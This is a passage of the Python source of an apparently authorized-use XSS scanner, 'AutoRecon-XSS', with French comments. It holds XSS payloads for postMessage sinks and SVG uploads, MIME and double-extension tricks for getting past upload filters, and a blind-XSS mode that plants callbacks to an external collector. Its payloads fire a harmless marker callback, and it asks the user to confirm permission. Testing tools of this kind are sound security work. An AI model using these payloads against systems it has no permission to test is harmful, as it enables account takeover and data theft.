                    page.set_content(self._form_page(point.url, action),
                                     wait_until="domcontentloaded")
                    # Le script soumet le form -> navigation vers la réponse.
                    try:
                        page.wait_for_load_state("load", timeout=self.timeout_ms)
                    except PWError:
                        pass
                else:
                    page.goto(action, timeout=self.timeout_ms, wait_until="load")
                page.wait_for_timeout(self.wait_ms)
                fired = self._fired(page, token)
            except PWError:
                fired = False
            finally:
                page.close()
            if fired:
                return payload, where
        return None


class StoredDomScanner:
    """Stored DOM XSS : injecte via N'IMPORTE QUEL point (y compris JSON), puis
    ouvre les pages d'observation DANS le navigateur avec la session courante et
    vérifie l'exécution. Couvre les chaînes 'login -> /api/... -> innerHTML' que
    ni le mode réfléchi (pas de réflexion serveur) ni le DOM simple (pas le bon
    point de départ) n'attrapent."""

    def __init__(self, http: Http, observe_urls, cookies=None, headers=None,
                 timeout_ms=8000, wait_ms=900, limit=100, insecure=False,
                 payloads=None, progress=True):
        self.http = http
        self.observe = list(dict.fromkeys(observe_urls))
        self.cookies = cookies
        self.headers = headers or {}
        self.timeout_ms = timeout_ms
        self.wait_ms = wait_ms
        self.limit = limit
        self.insecure = insecure
        self.payloads = payloads or DOM_PAYLOADS
        self.progress = progress

    def _origin(self, url: str) -> str:
        p = urlsplit(url)
        return f"{p.scheme}://{p.netloc}"

    def _browser_cookies(self, origin: str):
        """Cookies de la session requests (+ --cookies) au format Playwright,
        attachés à l'origine des pages d'observation."""
        jar = []
        for ck in self.http.s.cookies:
            jar.append({"name": ck.name, "value": ck.value, "url": origin})
        if self.cookies:
            for part in self.cookies.split(";"):
                if "=" in part:
                    k, v = part.split("=", 1)
                    jar.append({"name": k.strip(), "value": v.strip(), "url": origin})
        return jar

    def run(self, points: list[InjectionPoint]) -> list[Finding]:
        from playwright.sync_api import sync_playwright, Error as PWError
        uniq = {}
        for p in points:
            uniq[(p.url, p.method, p.param, p.header, p.seg_index)] = p
        targets = list(uniq.values())[: self.limit]
        findings: list[Finding] = []
        if not targets or not self.observe:
            return findings
        origin = self._origin(self.observe[0])
        extra = {"ignore_https_errors": True} if self.insecure else {}
        with sync_playwright() as pw:
            try:
                browser = pw.chromium.launch(headless=True)
            except PWError as e:
                msg = str(e)
                if "Executable doesn't exist" in msg or "playwright install" in msg:
                    print("[!] Navigateur Playwright non installé. Lance :\n"
                          "    playwright install chromium", file=sys.stderr)
                else:
                    print(f"[!] Navigateur indisponible : {msg}", file=sys.stderr)
                return findings
            prog = Progress(len(targets), label="[*] stored-dom") if self.progress else None
            for point in targets:
                hit = self._probe(browser, point, extra, origin, PWError)
                if prog:
                    prog.update()
                if hit:
                    payload, obs = hit
                    findings.append(Finding(
                        url=point.url, method=point.method, param=point.param,
                        header=point.header, context=f"stored-dom@{obs}",
                        reflected_chars=[], payload_echoed=payload, severity="high",
                        poc=(f"# injecte via {point.method} {point.url} "
                             f"(param {point.header or point.param}), "
                             f"puis ouvre {obs} dans un navigateur"),
                    ))
            if prog:
                prog.close()
            browser.close()
        return findings

    def _probe(self, browser, point, extra, origin, PWError):
        for raw in self.payloads:
            token = rand_marker(6)
            cb = f"window.__arxcb('{token}')"
            cb_bt = f"window.__arxcb`{token}`"
            payload = raw.replace("TOKENBT", cb_bt).replace("TOKEN", cb)
            # 1) injection via la session requests (gère JSON/POST/GET/header/path)
            send_payload(self.http, point, payload)
            # 2) observation dans le navigateur avec la session courante
            ctx = browser.new_context(**extra)
            ctx.add_init_script(_DOM_INIT)
            if self.headers:
                try:
                    ctx.set_extra_http_headers(self.headers)
                except PWError:
                    pass
            try:
                ctx.add_cookies(self._browser_cookies(origin))
            except PWError:
                pass
            where = None
            for obs in self.observe:
                page = ctx.new_page()
                try:
                    page.goto(obs, timeout=self.timeout_ms, wait_until="load")
                    page.wait_for_timeout(self.wait_ms)
                    if dom_hit(page, token):
                        where = obs
                except PWError:
                    pass
                finally:
                    page.close()
                if where:
                    break
            ctx.close()
            if where:
                return payload, where
        return None


# --------------------------------------------------------------------------- #
#  Scanner UPLOAD (XSS via fichier SVG/HTML)
# --------------------------------------------------------------------------- #
def _svg_payload(marker: str, beacon_tok: str) -> str:
    """SVG piégé : contient un marqueur traçable + un script/handler qui, SI le
    fichier est rendu comme page, appelle notre callback. Bénin."""
    return (
        '<?xml version="1.0" encoding="UTF-8"?>\n'
        '<svg xmlns="http://www.w3.org/2000/svg" width="1" height="1" '
        f'onload="window.__arxcb && window.__arxcb(\'{beacon_tok}\')">'
        f'<script>window.__arxcb && window.__arxcb("{beacon_tok}")</script>'
        f'<text x="0" y="0">{marker}</text></svg>'
    )


def _find_uploaded_url(resp, marker: str, base_url: str) -> str | None:
    """Tente de localiser l'URL du fichier uploadé dans la réponse.
    Heuristiques : en-tête Location, liens/JSON contenant le marqueur ou un
    chemin d'upload plausible."""
    if resp is None:
        return None
    loc = resp.headers.get("Location")
    if loc:
        return urljoin(base_url, loc)
    body = body_of(resp)
    # 1) une URL/chemin contenant notre marqueur (nom de fichier réfléchi)
    m = re.search(r'["\'(]([^"\'()\s]*' + re.escape(marker) + r'[^"\'()\s]*)["\')]', body)
    if m:
        return urljoin(base_url, m.group(1))
    # 2) un chemin d'upload typique
    m = re.search(r'["\'(](/?[^"\'()\s]*?(?:upload|files?|media|static|avatars?|img)[^"\'()\s]*?\.[a-z0-9]{2,5})["\')]',
                  body, re.I)
    if m:
        return urljoin(base_url, m.group(1))
    return None


class UploadScanner:
    """Détecte les XSS stockées via upload de fichier (SVG/HTML servi inline).
    Envoie un SVG piégé, retrouve où il est servi, puis vérifie Content-Type,
    Content-Disposition et si le script a survécu (non assaini)."""

    # (filename, content-type) à tenter pour contourner les filtres d'extension.
    VARIANTS = [
        ("{m}.svg", "image/svg+xml"),
        ("{m}.svg", "image/png"),          # bon type refusé -> on ment sur le MIME
        ("{m}.html", "text/html"),
        ("{m}.svg.png", "image/svg+xml"),  # double extension
    ]

    def __init__(self, http: Http, progress=True):
        self.http = http
        self.progress = progress

    def run(self, points: list[InjectionPoint]) -> list[Finding]:
        uniq = {}
        for p in points:
            if p.method == "UPLOAD":
                uniq[(p.url, p.param)] = p
        targets = list(uniq.values())
        findings: list[Finding] = []
        if not targets:
            return findings
        prog = Progress(len(targets), label="[*] upload  ") if self.progress else None
        for point in targets:
            f = self._probe(point)
            if prog:
                prog.update()
            if f:
                findings.append(f)
        if prog:
            prog.close()
        return findings

    def _probe(self, point: InjectionPoint) -> Finding | None:
        for fname_tpl, ctype in self.VARIANTS:
            marker = rand_marker()
            tok = rand_marker(4)
            svg = _svg_payload(marker, tok)
            fname = fname_tpl.format(m=marker)
            files = {point.param: (fname, svg, ctype)}
            data = {k: v for k, v in point.params.items() if k != point.param}
            r = self.http.post(point.url, data=data, files=files)
            if r is None:
                continue
            served_url = _find_uploaded_url(r, marker, point.url)
            if not served_url:
                continue
            rr = self.http.get(served_url)
            if rr is None:
                continue
            ct = rr.headers.get("Content-Type", "").lower()
            cd = rr.headers.get("Content-Disposition", "").lower()
            body = body_of(rr)
            if marker not in body:
                continue  # pas vraiment servi / transformé
            script_survived = "<script" in body.lower() or "onload" in body.lower()
            dangerous_ct = ("svg" in ct or "html" in ct or "xml" in ct or not ct.strip())
            inline = "attachment" not in cd
            f = Finding(url=point.url, method="UPLOAD", param=point.param)
            f.payload_echoed = fname
            if script_survived and dangerous_ct and inline:
                f.severity = "high"
                f.context = f"svg-upload servi inline ({ct or 'sans Content-Type'}) @ {served_url}"
                f.poc = (f"# upload SVG via {point.url} (champ {point.param}), "
                         f"servi exécutable sur {served_url}")
            elif script_survived and inline and not dangerous_ct:
                f.severity = "medium"
                f.context = f"fichier servi inline mais Content-Type={ct} @ {served_url}"
            elif marker in body:
                f.severity = "low"
                f.context = f"fichier uploadé servi (Content-Disposition={cd or 'absent'}) @ {served_url}"
            else:
                continue
            return f
        return None


# --------------------------------------------------------------------------- #
#  Scanner postMessage (DOM XSS via window.postMessage)
# --------------------------------------------------------------------------- #
# Formes de données testées : le handler peut lire event.data brut (string) ou
# une propriété (html/message/content/...). cb = appel du callback instrumenté.
POSTMSG_SHAPES = [
    ("string-html", lambda cb: f"<img src=x onerror={cb}>"),
    ("string-eval", lambda cb: cb),
    ("obj.html", lambda cb: {"html": f"<img src=x onerror={cb}>"}),
    ("obj.message", lambda cb: {"message": f"<img src=x onerror={cb}>"}),
    ("obj.content", lambda cb: {"content": f"<img src=x onerror={cb}>"}),
    ("obj.body", lambda cb: {"body": f"<img src=x onerror={cb}>"}),
    ("obj.data", lambda cb: {"data": f"<img src=x onerror={cb}>"}),
    ("obj.value", lambda cb: {"value": f"<img src=x onerror={cb}>"}),
    ("obj.type+html", lambda cb: {"type": "render", "html": f"<img src=x onerror={cb}>"}),
    ("obj.type+message", lambda cb: {"type": "message", "message": f"<img src=x onerror={cb}>"}),
    ("obj.code-eval", lambda cb: {"code": cb}),
    ("obj.callback-eval", lambda cb: {"callback": cb}),
    ("obj.url-js", lambda cb: {"url": f"javascript:{cb}"}),
    ("obj.src-js", lambda cb: {"src": f"javascript:{cb}"}),
]


class PostMessageScanner:
    """DOM XSS via window.postMessage : charge chaque page, et si elle écoute
    les 'message', lui envoie des messages piégés (plusieurs formes) et vérifie
    si un sink exécute notre callback. Nécessite Playwright.

    Limite : envoi same-origin (depuis la page elle-même). Détecte les handlers
    sans vérification d'origine (ou l'acceptant), soit la majorité des vulnérables ;
    un handler exigeant une origine tierce précise peut échapper."""

    def __init__(self, observe_urls, cookies=None, headers=None, timeout_ms=8000,
                 wait_ms=500, insecure=False, progress=True):
        self.observe = list(dict.fromkeys(observe_urls))
        self.cookies = cookies
        self.headers = headers or {}
        self.timeout_ms = timeout_ms
        self.wait_ms = wait_ms
        self.insecure = insecure
        self.progress = progress

    @staticmethod
    def available() -> bool:
        return DomScanner.available()

    def run(self) -> list[Finding]:
        from playwright.sync_api import sync_playwright, Error as PWError
        findings: list[Finding] = []
        if not self.observe:
            return findings
        extra = {"ignore_https_errors": True} if self.insecure else {}
        with sync_playwright() as pw:
            try:
                browser = pw.chromium.launch(headless=True)
            except PWError as e:
                msg = str(e)
                if "Executable doesn't exist" in msg or "playwright install" in msg:
                    print("[!] Navigateur Playwright non installé. Lance :\n"
                          "    playwright install chromium", file=sys.stderr)
                else:
                    print(f"[!] Navigateur indisponible : {msg}", file=sys.stderr)
                return findings
            ctx = browser.new_context(**extra)
            ctx.add_init_script(_DOM_INIT)
            if self.headers:
                try:
                    ctx.set_extra_http_headers(self.headers)
                except PWError:
                    pass
            if self.cookies:
                origin = f"{urlsplit(self.observe[0]).scheme}://{urlsplit(self.observe[0]).netloc}"
                jar = []
                for part in self.cookies.split(";"):
                    if "=" in part:
                        k, v = part.split("=", 1)
                        jar.append({"name": k.strip(), "value": v.strip(), "url": origin})
                try:
                    ctx.add_cookies(jar)
                except PWError:
                    pass
            prog = Progress(len(self.observe), label="[*] postmsg ") if self.progress else None
            for url in self.observe:
                f = self._probe(ctx, url, PWError)
                if prog:
                    prog.update()
                if f:
                    findings.append(f)
            if prog:
                prog.close()
            ctx.close()
            browser.close()
        return findings

    def _probe(self, ctx, url, PWError):
        page = ctx.new_page()
        try:
            page.goto(url, timeout=self.timeout_ms, wait_until="load")
            page.wait_for_timeout(self.wait_ms)
            try:
                has_msg = page.evaluate("window.__arx_has_msg === true")
            except PWError:
                has_msg = False
            if not has_msg:
                return None
            for name, fn in POSTMSG_SHAPES:
                token = rand_marker(5)
                cb = f"window.__arxcb('{token}')"
                data = fn(cb)
                try:
                    page.evaluate("(d) => window.postMessage(d, '*')", data)
                    page.wait_for_timeout(self.wait_ms)
                except PWError:
                    continue
                if dom_hit(page, token):
                    return Finding(
                        url=url, method="POSTMESSAGE", param=name,
                        context=f"postMessage sink ({name})",
                        reflected_chars=[], payload_echoed=json.dumps(data),
                        severity="high",
                        poc=(f"# ouvre {url}, puis depuis une autre fenêtre :\n"
                             f"#   win.postMessage({json.dumps(data)}, '*')"),
                    )
            return None
        except PWError:
            return None
        finally:
            page.close()


def build_poc(point: InjectionPoint, payload: str) -> str:
    """Commande curl reproduisant l'injection (pour un rapport/writeup)."""
    def sq(s: str) -> str:               # échappe pour quote simple shell
        return "'" + s.replace("'", "'\\''") + "'"

    if point.method == "HEADER":
        return f"curl -sk {sq(point.url)} -H {sq(f'{point.header}: {payload}')}"
    if point.method == "PATH":
        u = _dom_build_url(point, payload) or point.url
        return f"curl -sk {sq(u)}"
    if point.method == "GET":
        base = urlsplit(point.url)
        params = dict(point.params)
        params[point.param] = payload
        q = urlencode(params, safe="")
        u = urlunsplit((base.scheme, base.netloc, base.path, q, ""))
        return f"curl -sk {sq(u)}"
    if point.method == "JSON":
        params = dict(point.params)
        params[point.param] = payload
        return (f"curl -sk -X POST {sq(point.url)} "
                f"-H 'Content-Type: application/json' -d {sq(json.dumps(params))}")
    # POST
    params = dict(point.params)
    params[point.param] = payload
    return f"curl -sk -X POST {sq(point.url)} -d {sq(urlencode(params, safe=''))}"


# --------------------------------------------------------------------------- #
#  Rapport
# --------------------------------------------------------------------------- #
COLORS = {"high": "\033[91m", "medium": "\033[93m", "low": "\033[96m"}
RESET = "\033[0m"
SEVERITY_RANK = {"high": 0, "medium": 1, "low": 2}


def _label(f: Finding) -> str:
    return f.header if f.method == "HEADER" else f.param


def _sorted(findings: list[Finding]) -> list[Finding]:
    return sorted(findings, key=lambda x: SEVERITY_RANK.get(x.severity, 99))


def report_console(findings: list[Finding]):
    if not findings:
        print("\n[=] Aucun point réfléchi exploitable détecté.")
        return
    print(f"\n[+] {len(findings)} point(s) de réflexion détecté(s) :\n")
    for f in _sorted(findings):
        c = COLORS.get(f.severity, "")
        print(f"{c}[{f.severity.upper()}]{RESET} {f.method} {f.url}")
        print(f"      point    : {_label(f)}")
        print(f"      contexte : {f.context}")
        print(f"      chars    : {' '.join(f.reflected_chars) or '(encodés)'}")
        if f.payload_echoed:
            print(f"      echo     : {f.payload_echoed}")
        if f.csp:
            print(f"      CSP      : présente (peut gêner l'exécution)")
        if f.poc:
            print(f"      PoC      : {f.poc}")
        print()


def write_report(findings: list[Finding], path: str, fmt: str):
    if fmt == "json":
        with open(path, "w", encoding="utf-8") as fp:
            json.dump([asdict(f) for f in findings], fp,
                      indent=2, ensure_ascii=False)
    elif fmt == "csv":
        with open(path, "w", encoding="utf-8", newline="") as fp:
            w = csv.writer(fp)
            w.writerow(["severity", "method", "url", "point", "context",
                        "reflected_chars", "payload_echoed", "csp", "poc"])
            for f in _sorted(findings):
                w.writerow([f.severity, f.method, f.url, _label(f), f.context,
                            " ".join(f.reflected_chars), f.payload_echoed or "",
                            "yes" if f.csp else "", f.poc or ""])
    elif fmt == "md":
        lines = [f"# AutoRecon-XSS — {len(findings)} réflexion(s)", ""]
        lines.append("| Sévérité | Méthode | Point | Contexte | Chars | Echo | CSP | URL |")
        lines.append("|---|---|---|---|---|---|---|---|")
        for f in _sorted(findings):
            chars = (" ".join(f.reflected_chars) or "(encodés)").replace("|", "\\|")
            echo = (f.payload_echoed or "").replace("|", "\\|")
            lines.append(
                f"| {f.severity.upper()} | {f.method} | `{_label(f)}` | "
                f"{f.context} | `{chars}` | `{echo}` | {'oui' if f.csp else '—'} | {f.url} |"
            )
        # Section PoC détaillée (reproductible).
        pocs = [f for f in _sorted(findings) if f.poc]
        if pocs:
            lines += ["", "## PoC (reproduction)", ""]
            for f in pocs:
                lines += [f"- **{f.method} `{_label(f)}`** ({f.context}) :",
                          "  ```bash", f"  {f.poc}", "  ```"]
        with open(path, "w", encoding="utf-8") as fp:
            fp.write("\n".join(lines) + "\n")
    else:
        raise ValueError(f"format inconnu : {fmt}")
    print(f"[+] Rapport {fmt.upper()} écrit dans {path}")


# --------------------------------------------------------------------------- #
#  CLI
# --------------------------------------------------------------------------- #
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))


def resolve_payload_path(path: str) -> str:
    """Résout un chemin de payloads : tel quel s'il existe, sinon relativement
    au dossier du script (pour que `payloads/x.txt` marche depuis n'importe où)."""
    if os.path.exists(path):
        return path
    alt = os.path.join(SCRIPT_DIR, path)
    return alt if os.path.exists(alt) else path


def load_payloads(path: str):
    """Charge des sondes depuis un fichier.
    Format par ligne : `payload` ou `payload\tctx1,ctx2`.
    Le jeton PROBE (remplacé par un marqueur aléatoire) et {marker} sont gérés.
    """
    loaded = []
    all_ctx = {"html-body", "tag", "attribute", "javascript", "html-comment"}
    with open(path, encoding="utf-8") as fp:
        for line in fp:
            line = line.rstrip("\n")
            if not line.strip() or line.lstrip().startswith("#"):
                continue
            if "\t" in line:
                raw, ctx = line.split("\t", 1)
                ctxs = {c.strip() for c in ctx.split(",") if c.strip()}
            else:
                raw, ctxs = line, set(all_ctx)
            loaded.append((raw, ctxs or set(all_ctx)))
    return loaded


def load_dom_payloads_multi(arg: str) -> list[str]:
    """Charge un ou plusieurs fichiers de payloads DOM (séparés par ,)."""
    out = []
    for pth in arg.split(","):
        out += load_dom_payloads(resolve_payload_path(pth.strip()))
    return out


def load_dom_payloads(path: str) -> list[str]:
    """Charge des payloads DOM (un par ligne, jeton TOKEN, # = commentaire).
    Chaque ligne doit contenir TOKEN, remplacé par le callback instrumenté."""
    out = []
    with open(path, encoding="utf-8") as fp:
        for line in fp:
            line = line.rstrip("\n")
            if not line.strip() or line.lstrip().startswith("#"):
                continue
            # on garde une partie avant une éventuelle tabulation (contexte ignoré)
            raw = line.split("\t", 1)[0]
            if "TOKEN" in raw:
                out.append(raw)
    return out


def read_url_list(path: str) -> list[str]:
    """Lit une liste d'URLs (une par ligne ; # = commentaire)."""
    out = []
    with open(path, encoding="utf-8") as fp:
        for line in fp:
            line = line.strip()
            if line and not line.startswith("#"):
                out.append(line)
    return out


def fetch_wayback(http: Http, domain: str, limit: int = 5000,
                  with_subdomains: bool = False) -> list[str]:
    """Récupère des URLs historiques via l'API CDX de Wayback Machine.
    Ne renvoie que des URLs avec paramètres (candidats d'injection)."""
    host = f"*.{domain}/*" if with_subdomains else f"{domain}/*"
    cdx = (
        "https://web.archive.org/cdx/search/cdx"
        f"?url={quote(host, safe='*/.')}"
        "&output=text&fl=original&collapse=urlkey"
        "&filter=statuscode:200"
        f"&limit={int(limit)}"
    )
    resp = http.get(cdx)
    if resp is None:
        print("[!] Wayback injoignable.")
        return []
    urls = [ln.strip() for ln in body_of(resp).splitlines() if ln.strip()]
    # On garde uniquement les URLs paramétrées (seules testables en GET).
    return [u for u in urls if "?" in u]


def parse_header_args(values):
    """--add-header 'Name: value' (répétable) -> dict."""
    out = {}
    for v in values or []:
        if ":" not in v:
            print(f"[!] --add-header ignoré (format Name: value) : {v}")
            continue
        name, val = v.split(":", 1)
        out[name.strip()] = val.strip()
    return out


def _compile(label, pattern):
    if not pattern:
        return None
    try:
        return re.compile(pattern)
    except re.error as e:
        print(f"[!] {label} invalide : {e}")
        sys.exit(2)


def build_observe(args, crawler):
    """Liste des pages d'observation (stored/stored-dom/postMessage), plafonnée
    par --stored-limit pour éviter l'explosion combinatoire points × pages."""
    if args.stored_pages:
        obs = [u.strip() for u in args.stored_pages.split(",") if u.strip()]
    else:
        obs = sorted(crawler.links | crawler.urls) or [args.url]
    if args.stored_limit and len(obs) > args.stored_limit:
        print(f"[*] Observation plafonnée à {args.stored_limit} pages "
              f"(sur {len(obs)} ; --stored-limit pour ajuster).")
        obs = obs[: args.stored_limit]
    return obs


def main():
    ap = argparse.ArgumentParser(
        description="AutoRecon-XSS — scanner XSS multi-canal (usage autorisé uniquement).",
        epilog="Usage simple : python autorecon_xss.py https://cible.test/ --all --yes",
    )
    ap.add_argument("url_pos", nargs="?", metavar="URL",
                    help="URL cible (en positionnel ; alternative à -u)")
    ap.add_argument("-u", "--url", help="URL cible (ex: https://exemple.test/)")
    ap.add_argument("--all", action="store_true",
                    help="Active TOUS les modes auto (stored, stored-dom, dom, "
                         "upload, postMessage, headers, path) + charge les corpus "
                         "de payloads. Le moyen le plus simple de tout tester.")
    ap.add_argument("-p", "--pages", type=int, default=50, help="Nombre max de pages à crawler")
    ap.add_argument("-t", "--threads", type=int, default=8, help="Threads de scan")
    ap.add_argument("--cookies", help="En-tête Cookie pour les sessions authentifiées")
    ap.add_argument("--add-header", action="append", metavar="H",
                    help="En-tête personnalisé 'Name: value' (répétable)")
    ap.add_argument("--proxy", help="Proxy HTTP (ex: http://127.0.0.1:8080)")
    ap.add_argument("--timeout", type=int, default=10)
    ap.add_argument("--retries", type=int, default=2,
                    help="Tentatives supplémentaires sur erreur réseau")
    ap.add_argument("--delay", type=float, default=0.0,
                    help="Délai min entre requêtes en secondes (rate-limit)")
    ap.add_argument("--scope", help="Regex des netloc autorisés (périmètre). "
                                     "Défaut : même origine que --url.")
    ap.add_argument("--include", help="Ne crawler/tester que les URLs matchant cette regex")
    ap.add_argument("--exclude", help="Ignorer les URLs matchant cette regex (logout, etc.)")
    ap.add_argument("--sitemap", action="store_true",
                    help="Amorcer le crawl via robots.txt et sitemap.xml")
    ap.add_argument("-l", "--list", dest="url_list",
                    help="Fichier d'URLs à tester (une par ligne), en plus du crawl")
    ap.add_argument("--wayback", action="store_true",
                    help="Ingérer les URLs historiques (Wayback Machine CDX)")
    ap.add_argument("--wayback-subdomains", action="store_true",
                    help="Inclure les sous-domaines dans la requête Wayback")
    ap.add_argument("--wayback-limit", type=int, default=5000,
                    help="Nombre max d'URLs Wayback à récupérer (défaut 5000)")
    ap.add_argument("--no-crawl", action="store_true",
                    help="Ne pas crawler : tester uniquement liste/Wayback/URL donnée")
    ap.add_argument("--headers", action="store_true",
                    help="Tester aussi les en-têtes reflétés (Referer, User-Agent)")
    ap.add_argument("--path", action="store_true",
                    help="Tester aussi les segments de path (URLs REST-like)")
    ap.add_argument("--param", help="Paramètres à tester en plus (séparés par ,) "
                                    "même absents du HTML (ex: name,q,search)")
    ap.add_argument("--param-method", choices=["GET", "POST"], default="GET",
                    help="Méthode pour les --param manuels (défaut GET)")
    ap.add_argument("--payloads", help="Fichier de sondes personnalisées")
    ap.add_argument("--stored", action="store_true",
                    help="Détecter les réflexions de second ordre (stored) : "
                         "injecte puis observe d'autres pages dans la même session")
    ap.add_argument("--stored-pages",
                    help="URLs d'observation pour --stored (séparées par ,). "
                         "Défaut : les pages crawlées.")
    ap.add_argument("--stored-limit", type=int, default=30,
                    help="Max de pages d'observation pour stored/stored-dom/"
                         "postMessage (défaut 30 ; évite l'explosion combinatoire)")
    ap.add_argument("--max-requests", type=int, default=0,
                    help="Budget global de requêtes (0 = illimité). Garde-fou "
                         "anti-emballement : au-delà, le scan s'arrête proprement.")
    ap.add_argument("--dom", action="store_true",
                    help="Confirmer l'exécution côté client via Playwright (DOM XSS)")
    ap.add_argument("--dom-hash", action="store_true",
                    help="Tester aussi l'injection dans le fragment #... (DOM)")
    ap.add_argument("--dom-limit", type=int, default=200,
                    help="Nombre max de points testés dans le navigateur (défaut 200)")
    ap.add_argument("--dom-payloads",
                    help="Fichier de payloads DOM (jeton TOKEN) remplaçant les défauts")
    ap.add_argument("--stored-dom", action="store_true",
                    help="Stored DOM XSS : injecte via un point puis observe les "
                         "pages dans le navigateur (chaînes login->API->innerHTML)")
    ap.add_argument("--upload", action="store_true",
                    help="Tester les champs d'upload (XSS stockée via SVG/HTML servi inline)")
    ap.add_argument("--postmessage", action="store_true",
                    help="Fuzzer window.postMessage sur les pages (DOM XSS, Playwright)")
    ap.add_argument("--blind", metavar="CALLBACK",
                    help="Blind XSS : domaine collecteur out-of-band "
                         "(ex. xxxx.oast.pro d'Interactsh, ou ton XSS Hunter)")
    ap.add_argument("--no-blind-headers", action="store_true",
                    help="Ne pas injecter les sondes blind dans les en-têtes")
    ap.add_argument("--blind-out", default="blind_map.json",
                    help="Fichier de correspondance tag->point pour --blind")
    ap.add_argument("--insecure", action="store_true",
                    help="Ne pas vérifier les certificats TLS (risque MITM)")
    ap.add_argument("-o", "--output", help="Chemin du rapport")
    ap.add_argument("--format", choices=["json", "csv", "md"], default="json",
                    help="Format du rapport fichier (défaut: json)")
    ap.add_argument("--yes", action="store_true",
                    help="Confirme que tu es autorisé à tester la cible")
    ap.add_argument("--version", action="version",
                    version=f"AutoRecon-XSS {__version__}")
    args = ap.parse_args()

    # URL : positionnelle ou -u/--url.
    args.url = args.url or args.url_pos
    if not args.url:
        ap.error("fournis une URL (ex: python autorecon_xss.py https://cible.test/ --all --yes)")

    # --all : préréglage "tout activer" (le moyen le plus simple).
    if args.all:
        args.stored = True
        args.stored_dom = True
        args.dom = True
        args.dom_hash = True
        args.upload = True
        args.postmessage = True
        args.headers = True
        args.path = True
        if not args.payloads:
            args.payloads = "payloads/bypass.txt,payloads/mutation.txt"
        if not args.dom_payloads:
            args.dom_payloads = "payloads/dom.txt,payloads/mutation-dom.txt"

    if not args.yes:
        ans = input(f"Confirmes-tu être autorisé à tester {args.url} ? (oui/non) ").strip().lower()
        if ans not in ("oui", "o", "yes", "y"):
            print("Abandon : autorisation non confirmée.")
            sys.exit(1)

    scope = _compile("--scope", args.scope)
    include = _compile("--include", args.include)
    exclude = _compile("--exclude", args.exclude)

    global PAYLOADS
    if args.payloads:
        try:
            loaded = []
            for pth in args.payloads.split(","):
                loaded += load_payloads(resolve_payload_path(pth.strip()))
            PAYLOADS = loaded
            print(f"[*] {len(PAYLOADS)} sonde(s) chargée(s) depuis {args.payloads}")
        except OSError as e:
            print(f"[!] Lecture des payloads impossible : {e}")
            sys.exit(2)

    http = Http(timeout=args.timeout, cookies=args.cookies, proxy=args.proxy,
                verify=not args.insecure, delay=args.delay, retries=args.retries,
                pool=max(16, args.threads * 2), max_requests=args.max_requests,
                extra_headers=parse_header_args(args.add_header))

    crawler = Crawler(http, args.url, max_pages=args.pages, scope=scope,
                      include=include, exclude=exclude,
                      seed_sitemap=args.sitemap, path_inject=args.path)

    if args.no_crawl:
        # On teste au moins l'URL fournie si elle a des paramètres.
        crawler.ingest_param_urls([args.url])
    else:
        print(f"[*] Crawl de {args.url} (max {args.pages} pages)...")
        crawler.crawl()

    # Surface additionnelle : liste d'URLs + Wayback (endpoints paramétrés).
    extra: list[str] = []
    if args.url_list:
        try:
            extra += read_url_list(args.url_list)
        except OSError as e:
            print(f"[!] Lecture de --list impossible : {e}")
            sys.exit(2)
    if args.wayback:
        domain = urlparse(args.url).netloc
        print(f"[*] Wayback Machine pour {domain} (max {args.wayback_limit})...")
        extra += fetch_wayback(http, domain, limit=args.wayback_limit,
                               with_subdomains=args.wayback_subdomains)
    if extra:
        n = crawler.ingest_param_urls(extra)
        print(f"[*] {len(extra)} URL(s) ingérée(s) -> {n} point(s) GET ajouté(s).")

    points = crawler.points

    if args.param:
        names = [p.strip() for p in args.param.split(",") if p.strip()]
        base = urlsplit(args.url)
        existing = {k: v[0] for k, v in parse_qs(base.query).items()}
        clean_url = urlunsplit((base.scheme, base.netloc, base.path,
                                "" if args.param_method == "GET" else base.query, ""))
        for name in names:
            params = dict(existing)
            params.setdefault(name, "test")
            points.append(InjectionPoint(
                args.url if args.param_method == "GET" else clean_url,
                args.param_method, name, params))
        print(f"[*] {len(names)} paramètre(s) manuel(s) ajouté(s) ({args.param_method}).")

    if args.headers:
        for h in HEADER_POINTS:
            points.append(InjectionPoint(args.url, "HEADER", h, {}, header=h))

    print(f"[*] {len(crawler.urls)} URL(s), {len(points)} point(s) d'injection candidat(s).")
    # --postmessage opère sur les PAGES, pas sur des points d'injection : on ne
    # coupe court que s'il n'y a ni points ni scan basé sur les pages.
    if not points and not args.postmessage:
        print("[!] Aucun paramètre ni formulaire trouvé.")
        return

    # Modes navigateur demandés mais Playwright absent : prévenir une seule fois.
    if (args.dom or args.stored_dom or args.postmessage) and not DomScanner.available():
        print("[!] Playwright absent : modes navigateur (--dom/--stored-dom/"
              "--postmessage) ignorés.\n"
              "    pip install playwright && playwright install chromium")
        args.dom = args.stored_dom = args.postmessage = False

    findings: list[Finding] = []
    if points:
        print(f"[*] Scan réfléchi ({args.threads} threads)...")
        t0 = time.time()
        findings = Scanner(http, threads=args.threads).run(points)
        print(f"[*] Terminé en {time.time() - t0:.1f}s, {http.req_count} requête(s).")

    if args.stored:
        observe = build_observe(args, crawler)
        print(f"[*] Scan stored (2nd ordre) sur {len(observe)} page(s) d'observation...")
        stored = StoredScanner(http, observe, progress=True).run(points)
        print(f"[*] Stored terminé, {len(stored)} réflexion(s) de second ordre.")
        findings += stored

    if args.blind:
        print(f"[*] Blind XSS : injection de sondes -> {args.blind} ...")
        bmap = BlindScanner(http, args.blind,
                            inject_headers=not args.no_blind_headers).run(points)
        try:
            with open(args.blind_out, "w", encoding="utf-8") as fp:
                json.dump(bmap, fp, indent=2, ensure_ascii=False)
        except OSError as e:
            print(f"[!] Écriture {args.blind_out} impossible : {e}")
        print(f"[*] {len(bmap)} point(s) ensemencé(s). Correspondance tag->point "
              f"dans {args.blind_out}.")
        print(f"    Surveille ton collecteur ({args.blind}) : un hit depuis "
              f"'<tag>.{re.sub(r'^https?://', '', args.blind)}' identifie la source.")

    if args.postmessage:
        if not PostMessageScanner.available():
            print("[!] Playwright absent (requis pour --postmessage). Installe :\n"
                  "    pip install playwright && playwright install chromium")
        else:
            observe = build_observe(args, crawler)
            print(f"[*] Fuzzing postMessage sur {len(observe)} page(s)...")
            pm_findings = PostMessageScanner(
                observe, cookies=args.cookies,
                headers=parse_header_args(args.add_header), insecure=args.insecure,
            ).run()
            print(f"[*] postMessage terminé, {len(pm_findings)} sink(s) exécutable(s).")
            findings += pm_findings

    if args.upload:
        n_up = sum(1 for p in points if p.method == "UPLOAD")
        if n_up:
            print(f"[*] Scan upload ({n_up} champ(s) de fichier)...")
            up_findings = UploadScanner(http).run(points)
            print(f"[*] Upload terminé, {len(up_findings)} résultat(s).")
